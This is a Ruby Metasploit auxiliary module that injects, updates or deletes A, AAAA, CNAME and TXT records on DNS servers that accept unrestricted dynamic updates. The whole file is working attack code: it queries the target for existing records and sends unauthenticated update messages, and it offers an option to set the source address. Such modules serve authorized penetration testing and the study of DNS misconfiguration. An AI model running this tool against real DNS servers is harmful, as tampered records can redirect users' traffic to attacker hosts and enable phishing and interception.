# -*- coding: binary -*-

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'dnsruby'

class MetasploitModule < Msf::Auxiliary

  def initialize
    super(
      'Name' => 'DNS Server Dynamic Update Record Injection',
      'Description' => %q{
        This module allows adding and/or deleting a record to
        any remote DNS server that allows unrestricted dynamic updates.},
      'Author' => [
        'King Sabri <king.sabri[at]gmail.com>',
        'Brent Cook <brent_cook[at]rapid7.com>'
      ],
      'References' => [
        ['URL', 'https://www.tenable.com/plugins/nessus/35372'],
        ['URL', 'https://github.com/KINGSABRI/CVE-in-Ruby/tree/master/NONE-CVE/DNSInject'],
        ['URL', 'https://www.christophertruncer.com/dns-modification-dnsinject-nessus-plugin-35372/'],
        ['URL', 'https://github.com/ChrisTruncer/PenTestScripts/blob/master/HostScripts/DNSInject.py']
      ],
      'License' => MSF_LICENSE,
      'Actions' => [
        ['UPDATE', { 'Description' => 'Add or update a record. (default)' }],
        ['ADD', { 'Description' => 'Add a new record. Fail if it already exists.' }],
        ['DELETE', { 'Description' => 'Delete an existing record.' }]
      ],
      'DefaultAction' => 'UPDATE',
      'Notes' => {
        'Stability' => [CRASH_SAFE],
        'SideEffects' => [IOC_IN_LOGS, CONFIG_CHANGES],
        'Reliability' => []
      }
    )

    register_options([
      OptString.new('DOMAIN', [true, 'The domain name']),
      OptAddress.new('RHOST', [true, 'The vulnerable DNS server IP address']),
      OptString.new('HOSTNAME', [true, 'The name record you want to add']),
      OptAddress.new('IP', [false, 'The IP you want to assign to the record']),
      OptString.new('VALUE', [false, 'The string to be added with TXT or CNAME record']),
      OptEnum.new('TYPE', [true, 'The record type you want to add.', 'A', ['A', 'AAAA', 'CNAME', 'TXT']]),
      OptAddress.new('CHOST', [false, 'The source address to use for queries and updates'])
    ])
  end

  def record_action(type, type_enum, value, action)
    # Send the update to the zone's primary master.
    domain = datastore['DOMAIN']
    fqdn = "#{datastore['HOSTNAME']}.#{domain}"
    opts = { nameserver: datastore['RHOST'] }

    if datastore['CHOST'] && datastore['CHOST'] != ''
      if Rex::Socket.is_ipv4?(datastore['CHOST'])
        opts[:src_address] = datastore['CHOST']
      elsif Rex::Socket.is_ipv6?(datastore['CHOST'])
        opts[:src_address6] = datastore['CHOST']
      end
    end

    resolver = Dnsruby::Resolver.new(opts)
    update = Dnsruby::Update.new(domain)
    case action
    when :resolve
      begin
        answer = resolver.query(fqdn, type)
        if (answer.answer.count > 0)
          print_good "Found existing #{type} record for #{fqdn}"
          return true
        end
        return false
      rescue Dnsruby::ResolvError, IOError => e
        print_good "Did not find an existing #{type} record for #{fqdn}"
        vprint_error "Query failed: #{e.message}"
        return false
      end
    when :add
      print_status('Sending dynamic DNS add message...')
      update.absent("#{fqdn}.", type)
      update.add("#{fqdn}.", type_enum, 86400, value)
      begin
        resolver.send_message(update)
        print_good "The record '#{fqdn} => #{value}' has been added!"
        return true
      rescue Dnsruby::ResolvError, IOError => e
        print_error "Cannot add #{fqdn}"
        vprint_error 'The DNS server may not be vulnerable, or there may be a preexisting static record.'
        vprint_error "Update failed: #{e.message}"
      end
    when :delete
      begin
        print_status('Sending dynamic DNS delete message...')
        update.present(fqdn, type)
        update.delete(fqdn, type)
        resolver.send_message(update)
        print_good("The record '#{fqdn} => #{value}' has been deleted!")
        return true
      rescue Dnsruby::ResolvError, IOError => e
        print_error "Cannot delete #{fqdn}"
        vprint_error 'The DNS server may not be vulnerable, or there may be a preexisting static record.'
        vprint_error "Update failed: #{e.message}"
      end
    end

    false
  end

  def update_record(type:, type_enum:, value:, value_name:)
    if value.blank?
      print_error("Record type #{type} requires the #{value_name} parameter to be specified")
      return
    end

    force = datastore['CHOST'] && datastore['CHOST'] != ''
    case action.name
    when 'UPDATE'
      if force
        record_action(type, type_enum, value, :delete)
        record_action(type, type_enum, value, :add)
      elsif record_action(type, type_enum, value, :resolve)
        if record_action(type, type_enum, value, :delete)
          record_action(type, type_enum, value, :add)
        end
      else
        record_action(type, type_enum, value, :add)
      end
    when 'ADD'
      if force
        record_action(type, type_enum, value, :add)
      elsif record_action(type, type_enum, value, :resolve) == false
        record_action(type, type_enum, value, :add)
      else
        print_error 'Record already exists, try DELETE or UPDATE'
      end
    when 'DELETE'
      if force
        record_action(type, type_enum, value, :delete)
      elsif record_action(type, type_enum, value, :resolve)
        record_action(type, type_enum, value, :delete)
      else
        print_error 'Record does not exist, not deleting'
      end
    end
  end

  def run
    ip = datastore['IP']
    value = datastore['VALUE']
    case datastore['TYPE']
    when 'A'
      update_record(type: 'A', type_enum: Dnsruby::Types.A, value: ip, value_name: 'IP')
    when 'AAAA'
      update_record(type: 'AAAA', type_enum: Dnsruby::Types.AAAA, value: ip, value_name: 'IP')
    when 'CNAME'
      update_record(type: 'CNAME', type_enum: Dnsruby::Types.CNAME, value: value, value_name: 'VALUE')
    when 'TXT'
      update_record(type: 'TXT', type_enum: Dnsruby::Types.TXT, value: value, value_name: 'VALUE')
    else
      print_error 'Invalid Record Type!'
    end
  rescue ArgumentError => e
    print_error(e.message)
  rescue Dnsruby::OtherResolvError
    print_error('Connection Refused!')
  rescue Dnsruby::DecodeError
    print_error('Invalid DNS reply, ensure you are connecting to a DNS server')
  end
end
